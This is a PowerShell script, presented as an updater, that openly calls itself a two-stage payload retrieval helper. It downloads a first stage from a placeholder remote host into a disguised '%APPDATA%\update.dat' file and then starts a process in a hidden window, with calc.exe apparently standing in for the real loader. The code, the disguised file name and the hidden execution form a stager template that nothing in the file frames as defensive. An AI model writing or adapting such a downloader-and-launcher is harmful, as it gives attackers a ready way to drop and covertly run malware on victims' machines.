<#
.SYNOPSIS
    Two-stage payload retrieval helper.

.DESCRIPTION
    Fetches the first stage into a per-user working path and
    starts the staged loader after a basic existence check.

.EXAMPLE
    PS> .\updater.ps1
#>
[CmdletBinding()]
param(
    [string]$PayloadUrl = 'https://example.com:8443/stage1.ps1',
    [string]$DownloadPath = "$env:APPDATA\update.dat",
    [int]$StageTimeout = 106
)
$ErrorActionPreference = "Stop"

function Invoke-StageDownload {
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45
    )

    Write-Verbose ("Fetching " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Beginning first stage"
$OperationResult = Invoke-StageDownload -SourceUrl $PayloadUrl -DestinationPath $DownloadPath -TimeoutSec $StageTimeout
if ($OperationResult) {
    Start-Process -FilePath "calc.exe" -WindowStyle Hidden
}
Write-Verbose "stage marker 25 reached"
